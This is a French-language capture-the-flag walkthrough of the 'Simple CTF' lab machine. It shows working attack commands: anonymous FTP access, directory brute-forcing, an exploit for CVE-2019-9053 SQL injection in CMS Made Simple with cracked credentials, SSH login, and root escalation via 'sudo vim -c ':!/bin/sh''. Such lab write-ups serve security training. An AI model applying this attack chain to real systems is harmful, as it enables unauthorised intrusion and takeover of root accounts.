# Simple CTF

## I- Scanning

On utilise nmap `nmap -sC -sV <target ip>` ou tu peux faire un nmap agressif `nmap -A <target ip>` ou encore `nmap -sV <target ip>`

On regarde les ports ouvert et en fonction on peut essayer de se connecter aux services disponible (ex: HTTP, SSH, SMB etc…)

Ici on a FTP, SSH et un serveur web avec Apache qui sont ouvert

## II- Enumération

On peut commencer par inspecter le serveur FTP car d’après nmap on peut se connecter de manière anonyme sans les accès

```powershell
ftp anonymous
```

En faisant “dir” on a trouvé un fichier .txt intéressant, puis avec mget \<fichier> on a pu le récupérer sur notre machine, seulement après un “cat” nous avons seulement un indice comme quoi le mot de passe est faible.

On peut ensuite se connecter au serveur web qui tourne sur le port 80:

On utilise **gobuster** lors de cette étape pour découvrir les dossier présent sous la page web:

```powershell
gobuster dir -u http://<ip-cible> -w <wordlist>
```

On trouve un dossier caché: /simple

Sur la page de ce dossier /simple, on sait qu’il est utilisé par “CMS Made Simple” version 2.2.8 qui est associé à une vulnérabilité (Injection SQL)

[https://nvd.nist.gov/vuln/detail/CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)

```powershell
searchsploit cms made simple 2.2.8
```

## III- Exploitation

On va donc utiliser cet exploit.

```powershell
python CVE-2019-9053.py -u <http://10.10.2.28/simple/> --crack -w 10k-most-common.txt
```

Il nous trouve un username ainsi que le mot de passe

```powershell
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

On va utiliser tout ça pour se connecter en SSH:

```powershell
ssh mitch@<ip-cible> -p 2222
```

Il suffit maintenant de se balader dans l’arborescence pour avoir le premier flag.

## IV-Escalation de privilège

Pour vérifier ce que notre user actuel peut faire en tant que root:

```powershell
sudo -l
```

Ce dernier peut utiliser vim, on vérifie sur le site si il n’y a pas d’escalation de privilège là-dessus:

[https://gtfobins.github.io/gtfobins/](https://gtfobins.github.io/gtfobins/)

```powershell
sudo vim -c ':!/bin/sh'
```

On passe en shell root, on peut faire un whoami pour vérifier que nous sommes bien root.
